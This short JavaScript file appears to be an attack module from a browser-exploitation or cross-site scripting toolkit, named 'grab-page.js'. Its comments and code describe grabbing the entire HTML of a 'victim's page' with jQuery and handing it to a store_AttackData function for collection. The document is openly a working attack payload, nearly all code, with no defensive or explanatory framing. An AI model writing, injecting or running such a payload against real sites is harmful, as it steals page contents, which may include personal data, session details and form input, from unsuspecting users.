/*	Grab the entire contents of the victims page. */
var attack_module = 'grab-page.js';

var page = $("html").html();

//Store the attack data.
store_AttackData(page);
